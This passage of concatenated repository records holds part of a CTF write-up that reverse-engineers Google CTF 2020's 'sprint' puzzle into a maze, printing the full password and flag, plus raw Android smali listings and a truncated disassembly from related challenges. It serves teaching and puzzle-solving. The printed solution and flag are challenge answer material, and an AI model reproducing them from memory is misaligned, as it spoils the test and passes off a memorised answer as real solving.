([0xFFF0]) {\n    error_num = 4;\n    halt;\n  }\n\n  // if we bumped into a wall, halt (eventually)\n  [0xFFEF] = [0xF000 + map_position];\n  [0xFFF0] = 0x0000;\n  if ([0x7000 + [0xFFEF] * 2]) { // note [0xFFEF] re-mapping coordinates\n    pw_valid = 0;\n    error_num = 2;\n    continue;\n  }\n\n  // if we hit a checkpoint, increase the checkpoint counter\n  if ([0xF103 + checkpoint_counter] == -map_position) {\n    checkpoint_counter += 1;\n  }\n}\n```\n\nHere is the really interesting part. Our password is checked one byte at a time. Each byte must be one of `u`, `r`, `d`, or `l`. Considering what we see in the memory and what each of the characters maps to, we can conclude that our password is actually a series of `up`, `right`, `down`, and `left` steps in a maze!\n\nThe maze is `16 ⨉ 16` tiles in size, but it is stored linearly in memory, so an `up` step is encoded as an offset of `-16`, and likewise a `down` step is encoded as the offset `16`. This way the single variable `map_position` can be used to encode our position in the map.\n\nSpeaking of `map_position`, it is loaded from the memory location `0xF100`. The word stored there is `0x0011`, i.e. we start in the second column, second row.\n\nBut the pattern generated into memory location `0x7000` does not really look like a maze. It is somewhat chaotic, but there are clearly no ways to navigate the empty positions. The answer comes from the conditional used to check wall bumps. Understanding the unaligned memory write-then-read access idiom, it can be expressed instead as:\n\n```\nif ([0x7000 + ([0xF000 + map_position] & 0xFF) * 2]) ...\n```\n\nThere is a double indirection happening. The data at `0xF000` encodes how our position in the map maps to the walls encoded at `0x7000`. If we undo this re-mapping, we get a maze that looks like this:\n\n```\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXX  XX          XX              XX\nXX  XX  XXXXXXXXXX  XXXXXXXXXXXXXX\nXX              XX  XX  XX      XX\nXX  XXXXXXXXXX  XX  XX  XX  XXXXXX\nXX  XX  XX                      XX\nXXXXXX  XXXXXX  XXXXXXXXXXXXXX  XX\nXX      XX      XX      XX      XX\nXX  XXXXXXXXXX  XXXXXX  XXXXXXXXXX\nXX              XX  XX      XX  XX\nXX  XX  XXXXXXXXXX  XX  XXXXXX  XX\nXX  XX  XX  XX  XX              XX\nXX  XXXXXX  XX  XX  XX  XXXXXXXXXX\nXX                  XX          XX\nXXXXXX  XX  XXXXXXXXXX  XX  XXXXXX\nXX      XX  XX          XX      XX\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n```\n\nThat looks a lot more like a maze! The right and bottom walls are not actually encoded directly, but they are there because:\n\n - Walking off the bottom edge puts the player out of bounds (`map_position >= 0x100`), which is checked for.\n - Walking off the right edge of the map puts the player in the leftmost column of the next row, which is always either a wall, or out of bounds.\n\nWe also have a `checkpoint_counter` variable. There are certain positions in the map encoded at the `0xF103` memory location. If we number these in order and add them to the map, we get:\n\n```\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nXX  XX          XX             8XX\nXX  XX  XXXXXXXXXX  XXXXXXXXXXXXXX\nXX              XX  XX  XX     5XX\nXX  XXXXXXXXXX  XX  XX  XX  XXXXXX\nXX 2XX 4XX                      XX\nXXXXXX  XXXXXX  XXXXXXXXXXXXXX  XX\nXX      XX 7    XX      XX 0    XX\nXX  XXXXXXXXXX  XXXXXX  XXXXXXXXXX\nXX              XX  XX      XX  XX\nXX  XX  XXXXXXXXXX  XX  XXXXXX  XX\nXX  XX  XX  XX 3XX              XX\nXX  XXXXXX  XX  XX  XX  XXXXXXXXXX\nXX                  XX          XX\nXXXXXX  XX  XXXXXXXXXX  XX  XXXXXX\nXX 6    XX  XX          XX     1XX\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n```\n\n([Full map analysis script](scripts/SprintMap.hx))\n\n#### Additional password checks\n\n```\n// if some characters were invalid or we bumped into a wall, halt\nif (!pw_valid) {\n  [0xE800] = 0x0000;\n  halt;\n}\n\n// if we did not make it through exactly 9 checkpoints, halt\nif (checkpoint_counter != 9) {\n  error_num = 3;\n  [0xE800] = 0x0000;\n  halt;\n}\n```\n\nNot much to comment on here. `pw_valid` is set to `0` if the password includes an invalid character, or if we bumped into a wall. We also learn here that there are 9 checkpoints.\n\n#### Flag decoding\n\n```\n// success, let's decode the flag\nlet flag_position = 0;\nlet pw_position = 0;\nwhile (flag_position != 39) {\n  let block_counter = 4;\n  let checksum = 0;\n\n  do {\n    checksum *= 4;\n    let pw_byte = [0xE000 + pw_position];\n    if (pw_byte == 'u') {\n      // checksum += 0x0000;\n    } else if (pw_byte == 'r') {\n      checksum += 0x0001;\n    } else if (pw_byte == 'd') {\n      checksum += 0x0002;\n    } else if (pw_byte == 'l') {\n      checksum += 0x0003;\n    } else {\n      [0xE800] = 0x0000;\n      halt;\n    }\n    pw_position += 1;\n    block_counter -= 1;\n  } while (block_counter);\n\n  [0xE800 + flag_position] = [0xF10C + flag_position] + checksum;\n  flag_position += 0x0001;\n}\n\n// add a null byte and let's call it a string\n[0xE800 + flag_position] = 0x0000;\nhalt;\n```\n\nOnce the password passes all checks, we proceed to decoding the flag. Decoding consists of 39 rounds where 4 bytes of the password are taken at a time, an 8-bit checksum value is generated from them, then the checksum is added\nto a byte the encrypted flag stored in the program memory at `0xF10C`:\n\n```\n9E FF A1 26 14 3B 68 60 6B C7 34 C4 0A 1B 6D 8C C9 47 76 65 32 74 5F E2 25 72 32 74 62 0A B9 81 6E C6 17 E3 C5 66 7D\n```\n\n#### Bruteforcing\n\nWe have everything we need to find the correct password, but let's quickly talk about bruteforcing. This might have been relevant had we wanted to reach a solution as quickly as possible, without reverse engineering the program completely.\n\nIn the flag decoding part, we do 39 rounds of 4 bytes of the password. `39 * 4 == 156`, which is less than `254`. So, even though the password needs to pass the checks, only the first `156` bytes matter for the decryption.\n\nAlthough the password consists of 4 different characters, and 4 bytes of the password have `4 ** 4 == 256` different values, knowing that there is a maze at all might lead us to guess the fact that directions always come in pairs. This leaves us with in fact `4 ** 2 == 16` different values for each byte of the encrypted flag. Since the decryption is linear, at least half of these values would result in bytes outside of the ASCII range.\n\nWith these restrictions, we have:\n\n```\n>OA&d;h`kg4dZkm,iGve2t_2%r2tbZY!nfg3ef}\nCTFvi+XP[l$i_ ]|n7fU\"dO7ub\"dR_^q^kl8jVm\nHYK+n@mep!9ndpr1#L{j7yd<*w7ygdc&s !=ok\"\nM^P{#0]U`q)#i%b6s<kZ'iTAzg'iWihvcpqB$[r\n   0sErju&>s uw;(Q o<~i /|<~l  +x%& tp'\n     5bZev.  *g xAp_,nY 4l,n\\  {huv  `w\n   5 Jwoz C  z|  V%tA#n $!A#q  0}    u,\n   % :g_j 3   l  Fud1s^  q1sa   m    e|\n```\n\nWhere each column has exactly one character of the flag. We can see the `CTF` prefix, which happens to line up at the same offsets, but the remained of the flag is not trivial to deduce. Still, some dictionary-based attack might be possible.\n\n([Full brute force script](scripts/SprintSolve.hx))\n\n### Finding the correct password\n\nWell, let's navigate the maze! We start in the top-left corner and we need to hit the checkpoints `0`...`8` in order. The shortest (unique) paths are:\n\n- `ddrrrrrrddrrrrrrrrddll` - start to `0`\n- `rruullllllllddddllllllddddrrrrrrrruurrddrrddrr` - `0` to `1`\n- `lluulluullddlllllllluuuurrrrrruuuuuulllllldd` - `1` to `2`\n- `uurrrrrrddddddllllllddddrrrrrruu` - `2` to `3`\n- `ddlllllluuuuuurruu` - `3` to `4`\n- `ddllddrrrrrruuuurrrrrruurr` - `4` to `5`\n- `llddllllllddddllllllddddrrddll` - `5` to `6`\n- `rruulluuuurrrrrruull` - `6` to `7`\n- `rruurruuuurrrrrr` - `7` to `8`\n\nPutting it all together, we have `ddrrrrrrddrrrrrrrrddllrruullllllllddddllllllddddrrrrrrrruurrddrrddrrlluulluullddlllllllluuuurrrrrruuuuuulllllldduurrrrrrddddddllllllddddrrrrrruuddlllllluuuuuurruuddllddrrrrrruuuurrrrrruurrllddllllllddddllllllddddrrddllrruulluuuurrrrrruullrruurruuuurrrrrr`. Exactly `254` characters long, which is promising.\n\nAnd, sure enough:\n\n```bash\n$ ./sprint\nInput password:\nddrrrrrrddrrrrrrrrddllrruullllllllddddllllllddddrrrrrrrruurrddrrddrrlluulluullddlllllllluuuurrrrrruuuuuulllllldduurrrrrrddddddllllllddddrrrrrruuddlllllluuuuuurruuddllddrrrrrruuuurrrrrruurrllddllllllddddllllllddddrrddllrruulluuuurrrrrruullrruurruuuurrrrrr\nFlag: CTF{n0w_ev3n_pr1n7f_1s_7ur1ng_c0mpl3te}\n```\n", "timestamp": "2025-10-24T11:39:30.878935"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/files/android-bytecode-1.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/files/android-bytecode-1.txt", "content": ".method public constructor <init>()V\n  .catch Ljava/lang/Exception; { :L0 .. :L1 } :L5\n  .catch Ljava/lang/Error; { :L0 .. :L1 } :L5\n  .catch I { :L0 .. :L1 } :L6\n  .catch Ljava/lang/Exception; { :L2 .. :L4 } :L5\n  .registers 15\n    invoke-direct { p0 }, Landroid/app/Activity;-><init>()V\n  :L0\n    const/16 v0, 12\n    new-array v1, v0, [J\n    fill-array-data v1, :L7\n    iput-object v1, p0, Lcom/google/ctf/sandbox/\\u0151;->class:[J\n    new-array v0, v0, [J\n    iput-object v0, p0, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    const/4 v0, 0\n    iput v0, p0, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n  :L1\n    goto/16 :L3\n  :L2\n  :L3\n    return-void\n  :L4\n  :L5\n    goto :L0\n  :L6\n    goto :L3\n  :L7\n  .array-data 8\n    107t -104t 113t 2t 0t 0t 0t 0t\n    -55t 57t 66t -90t 0t 0t 0t 0t\n    75t -19t 29t 39t 0t 0t 0t 0t\n    67t 97t 24t 1t 0t 0t 0t 0t\n    -97t 34t -6t -64t 0t 0t 0t 0t\n    -65t 16t 14t 105t 0t 0t 0t 0t\n    87t -94t -36t 40t 0t 0t 0t 0t\n    -47t -103t -58t 22t 0t 0t 0t 0t\n    -3t 111t -91t 85t 0t 0t 0t 0t\n    -95t 112t -72t 126t 0t 0t 0t 0t\n    -97t 121t -55t -59t 0t 0t 0t 0t\n    101t -114t -125t 47t 0t 0t 0t 0t\n  .end array-data\n.end method\n", "timestamp": "2025-10-24T11:39:31.358239"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/files/android-bytecode-2.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/files/android-bytecode-2.txt", "content": ".method public onClick(Landroid/view/View;)V\n  .catch Ljava/lang/Exception; { :L1 .. :L6 } :L0\n  .catch Ljava/lang/Error; { :L1 .. :L6 } :L0\n  .catch J { :L1 .. :L6 } :L0\n  .catch Ljava/lang/Exception; { :L7 .. :L14 } :L0\n  .registers 20\n    move-object/from16 v1, p0\n    iget-object v2, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    const/4 v3, 0\n    iput v3, v2, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    const/16 v2, 49\n    const/4 v3, 0\n    const/4 v4, 3\n    const/4 v5, 2\n    const/4 v6, 1\n    const/4 v7, 4\n    goto :L2\n  :L0\n    const/16 v2, 49\n    const/4 v3, 0\n    const/4 v4, 3\n    const/4 v5, 2\n    const/4 v6, 1\n    const/4 v7, 4\n    goto/16 :L7\n  :L1\n  :L2\n    new-array v2, v2, [Ljava/lang/Object;\n    const/16 v8, 65\n    invoke-static { v8 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v8\n    aput-object v8, v2, v3\n    const/16 v8, 112\n    invoke-static { v8 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v6\n    invoke-static { v8 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v8\n    aput-object v8, v2, v5\n    const/16 v8, 97\n    invoke-static { v8 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v4\n    const/16 v9, 114\n    invoke-static { v9 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v7\n    const/4 v9, 5\n    const/16 v10, 101\n    invoke-static { v10 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v10\n    aput-object v10, v2, v9\n    const/4 v9, 6\n    const/16 v10, 110\n    invoke-static { v10 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v11\n    aput-object v11, v2, v9\n    const/4 v9, 7\n    const/16 v11, 116\n    invoke-static { v11 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v12\n    aput-object v12, v2, v9\n    const/16 v9, 8\n    const/16 v12, 108\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v12\n    aput-object v12, v2, v9\n    const/16 v9, 9\n    const/16 v12, 121\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v12\n    aput-object v12, v2, v9\n    const/16 v9, 10\n    const/16 v12, 32\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v13\n    aput-object v13, v2, v9\n    const/16 v9, 11\n    invoke-static { v11 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v13\n    aput-object v13, v2, v9\n    const/16 v9, 12\n    const/16 v13, 104\n    invoke-static { v13 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v14\n    aput-object v14, v2, v9\n    const/16 v9, 13\n    const/16 v14, 105\n    invoke-static { v14 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v15\n    aput-object v15, v2, v9\n    const/16 v9, 14\n    const/16 v15, 115\n    invoke-static { v15 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 15\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 16\n    invoke-static { v14 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 17\n    invoke-static { v15 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 18\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 19\n    invoke-static { v10 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 20\n    const/16 v3, 111\n    invoke-static { v3 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 21\n    invoke-static { v11 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 22\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 23\n    invoke-static { v11 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 24\n    invoke-static { v13 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v9\n    const/16 v9, 25\n    const/16 v6, 101\n    invoke-static { v6 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v9\n    const/16 v6, 26\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v6\n    const/16 v6, 27\n    const/16 v9, 102\n    invoke-static { v9 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v6\n    const/16 v6, 28\n    const/16 v9, 108\n    invoke-static { v9 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v6\n    const/16 v6, 29\n    invoke-static { v8 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v9\n    aput-object v9, v2, v6\n    const/16 v6, 30\n    const/16 v9, 103\n    invoke-static { v9 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v16\n    aput-object v16, v2, v6\n    const/16 v6, 31\n    const/16 v5, 46\n    invoke-static { v5 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v5\n    aput-object v5, v2, v6\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v5\n    aput-object v5, v2, v12\n    const/16 v5, 33\n    const/16 v6, 87\n    invoke-static { v6 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 34\n    invoke-static { v13 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 35\n    invoke-static { v8 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 36\n    invoke-static { v11 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 37\n    const/16 v6, 39\n    invoke-static { v6 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 38\n    invoke-static { v15 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 39\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 40\n    invoke-static { v9 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 41\n    invoke-static { v3 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 42\n    invoke-static { v14 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 43\n    invoke-static { v10 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 44\n    invoke-static { v9 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 45\n    invoke-static { v12 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v6\n    aput-object v6, v2, v5\n    const/16 v5, 46\n    invoke-static { v3 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v3\n    aput-object v3, v2, v5\n    const/16 v3, 47\n    invoke-static { v10 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v5\n    aput-object v5, v2, v3\n    const/16 v3, 48\n    const/16 v5, 63\n    invoke-static { v5 }, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;\n    move-result-object v5\n    aput-object v5, v2, v3\n    new-instance v3, Ljava/lang/StringBuilder;\n    invoke-direct { v3 }, Ljava/lang/StringBuilder;-><init>()V\n    array-length v5, v2\n    const/4 v6, 0\n  :L3\n    if-ge v6, v5, :L4\n    aget-object v8, v2, v6\n    move-object v9, v8\n    check-cast v9, Ljava/lang/Character;\n    invoke-virtual { v9 }, Ljava/lang/Character;->charValue()C\n    move-result v9\n    invoke-virtual { v3, v9 }, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;\n    add-int/lit8 v6, v6, 1\n    goto :L3\n  :L4\n    iget-object v5, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$editText:Landroid/widget/EditText;\n    invoke-virtual { v5 }, Landroid/widget/EditText;->getText()Landroid/text/Editable;\n    move-result-object v5\n    invoke-virtual { v5 }, Ljava/lang/Object;->toString()Ljava/lang/String;\n    move-result-object v5\n    invoke-virtual { v3 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;\n    move-result-object v6\n    invoke-virtual { v5, v6 }, Ljava/lang/String;->equals(Ljava/lang/Object;)Z\n    move-result v5\n    if-eqz v5, :L5\n    iget-object v5, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v6, \"\\ud83d\\udea9\"\n    invoke-virtual { v5, v6 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    goto :L6\n  :L5\n    iget-object v5, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v6, \"\\u274c\"\n    invoke-virtual { v5, v6 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n  :L6\n    goto/16 :L13\n  :L7\n    iget-object v3, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$editText:Landroid/widget/EditText;\n    invoke-virtual { v3 }, Landroid/widget/EditText;->getText()Landroid/text/Editable;\n    move-result-object v3\n    invoke-virtual { v3 }, Ljava/lang/Object;->toString()Ljava/lang/String;\n    move-result-object v3\n    invoke-virtual { v3 }, Ljava/lang/String;->length()I\n    move-result v5\n    const/16 v6, 48\n    if-eq v5, v6, :L8\n    iget-object v4, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v5, \"\\u274c\"\n    invoke-virtual { v4, v5 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    return-void\n  :L8\n    const/4 v5, 0\n  :L9\n    invoke-virtual { v3 }, Ljava/lang/String;->length()I\n    move-result v6\n    div-int/2addr v6, v7\n    if-ge v5, v6, :L10\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    mul-int/lit8 v8, v5, 4\n    add-int/2addr v8, v4\n    invoke-virtual { v3, v8 }, Ljava/lang/String;->charAt(I)C\n    move-result v8\n    shl-int/lit8 v8, v8, 24\n    int-to-long v8, v8\n    aput-wide v8, v6, v5\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    aget-wide v8, v6, v5\n    mul-int/lit8 v10, v5, 4\n    const/4 v11, 2\n    add-int/2addr v10, v11\n    invoke-virtual { v3, v10 }, Ljava/lang/String;->charAt(I)C\n    move-result v10\n    shl-int/lit8 v10, v10, 16\n    int-to-long v12, v10\n    or-long/2addr v8, v12\n    aput-wide v8, v6, v5\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    aget-wide v8, v6, v5\n    mul-int/lit8 v10, v5, 4\n    const/4 v12, 1\n    add-int/2addr v10, v12\n    invoke-virtual { v3, v10 }, Ljava/lang/String;->charAt(I)C\n    move-result v10\n    shl-int/lit8 v10, v10, 8\n    int-to-long v12, v10\n    or-long/2addr v8, v12\n    aput-wide v8, v6, v5\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v6, v6, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    aget-wide v8, v6, v5\n    mul-int/lit8 v10, v5, 4\n    invoke-virtual { v3, v10 }, Ljava/lang/String;->charAt(I)C\n    move-result v10\n    int-to-long v12, v10\n    or-long/2addr v8, v12\n    aput-wide v8, v6, v5\n    add-int/lit8 v5, v5, 1\n    goto :L9\n  :L10\n    const-wide v4, 4294967296L\n    iget-object v6, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v7, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v7, v7, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    iget-object v8, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v8, v8, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    aget-wide v8, v7, v8\n    invoke-static { v8, v9, v4, v5 }, Lcom/google/ctf/sandbox/R;->\\u0151(JJ)[J\n    move-result-object v6\n    const/4 v7, 0\n    aget-wide v7, v6, v7\n    rem-long/2addr v7, v4\n    add-long/2addr v7, v4\n    rem-long/2addr v7, v4\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v9, v9, Lcom/google/ctf/sandbox/\\u0151;->class:[J\n    iget-object v10, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v10, v10, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    aget-wide v10, v9, v10\n    cmp-long v9, v7, v10\n    if-eqz v9, :L11\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v10, \"\\u274c\"\n    invoke-virtual { v9, v10 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    return-void\n  :L11\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v10, v9, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    const/4 v11, 1\n    add-int/2addr v10, v11\n    iput v10, v9, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget v9, v9, Lcom/google/ctf/sandbox/\\u0151;->ő:I\n    iget-object v10, v1, Lcom/google/ctf/sandbox/\\u0151$1;->this$0:Lcom/google/ctf/sandbox/\\u0151;\n    iget-object v10, v10, Lcom/google/ctf/sandbox/\\u0151;->ő:[J\n    array-length v10, v10\n    if-lt v9, v10, :L12\n    iget-object v9, v1, Lcom/google/ctf/sandbox/\\u0151$1;->val$textView:Landroid/widget/TextView;\n    const-string v10, \"\\ud83d\\udea9\"\n    invoke-virtual { v9, v10 }, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V\n    return-void\n  :L12\n    new-instance v8, Ljava/lang/RuntimeException;\n    invoke-direct { v8 }, Ljava/lang/RuntimeException;-><init>()V\n    throw v8\n  :L13\n    return-void\n  :L14\n.end method\n", "timestamp": "2025-10-24T11:39:31.532300"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2020-08-22-Google-CTF/files/sprint-assembly.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2020-08-22-Google-CTF/files/sprint-assembly.txt", "content": "0x0000: regB  = 0x7000\n0x0026: regA  = regB\n0x004A: *regA = 0x1\n0x006C: regA  = 0x2 + regB\n0x0095: *regA = 0x1\n0x00B7: regC  = 0x2\n0x00DA: regF  = regC + regC\n0x0108: regA  = 0x7000 + regF\n0x0136: regE  = *regA\n0x015B: if (regE) goto 0x324 else goto 0x180\n\n0x0180: regD  = regC + regC\n0x01AE: regA  = 0xFFEF\n0x01D4: *regA = regD\n0x01F9: regA  = 0xFFF0\n0x021F: regE  = *regA\n0x0244: if (regE) goto 0x324 else goto 0x269\n\n0x0269: regF  = regD + regD\n0x0297: regA  = 0x7000 + regF\n0x02C5: *regA = 0x1\n0x02E7: regD  = regD + regC\n0x0315: goto 0x1AE\n\n0x0324: regC  = 0x1 + regC\n0x034F: if (regC) goto 0x0DA else goto 0x374\n\n0x0374: regB  = 0xE000\n0x039A: regC  = 0x0\n0x03BD: regA  = regB\n0x03E1: regD  = *regA\n0x0406: if (regD) goto 0x43A else goto 0x4A1\n\n0x043A: regC  = 0xFFFF + regC\n0x0469: regB  = 0x1 + regB\n0x0492: goto 0x3BD\n\n0x04A1: regF  = 0xFE + regC\n0x04D0: if (regF) goto 0x504 else goto 0x536\n\n0x0504: regI  = 0x5\n0x0527: goto 0x13D9\n\n0x0536: regB  = 0x0\n0x0558: regC  = 0x0\n0x057B: regA  = 0xF100\n0x05A1: regD  = *regA\n0x05C6: regE  = 0x1\n0x05E9: regI  = 0x0\n0x060C: regA  = 0xE000 + regB\n0x0639: regF  = *regA\n0x065E: if (regF) goto 0x692 else goto 0xD97\n\n0x0692: regB  = 0x1 + regB\n0x06BB: regG  = 0xFF8B + regF\n0x06EA: if (regG) goto 0x745 else goto 0x70F\n\n0x070F: regF  = 0xFFF0\n0x0736: goto 0x945\n\n0x0745: regG  = 0xFF8E + regF\n0x0774: if (regG) goto 0x7CB else goto 0x799\n\n0x0799: regF  = 0x1\n0x07BC: goto 